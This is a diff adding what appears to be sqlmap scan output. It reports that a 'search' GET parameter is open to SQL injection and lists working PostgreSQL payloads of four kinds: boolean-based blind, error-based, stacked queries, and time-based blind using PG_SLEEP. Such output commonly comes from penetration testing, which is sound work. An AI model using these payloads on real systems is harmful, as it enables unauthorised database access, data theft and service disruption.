@@ -1,0 +1,16 @@
+Parameter: search (GET)
+    Type: boolean-based blind
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: search=1' AND (SELECT (CASE WHEN (8647=8647) THEN NULL ELSE CAST((CHR(108)||CHR(104)||CHR(100)||CHR(122)) AS NUMERIC) END)) IS NULL-- JqXH
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: search=1' AND 9268=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9268=9268) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(122)||CHR(106)||CHR(113)) AS NUMERIC)-- wLYN
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=1';SELECT PG_SLEEP(5)--
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: search=1' AND 9363=(SELECT 9363 FROM PG_SLEEP(5))-- UfDZ
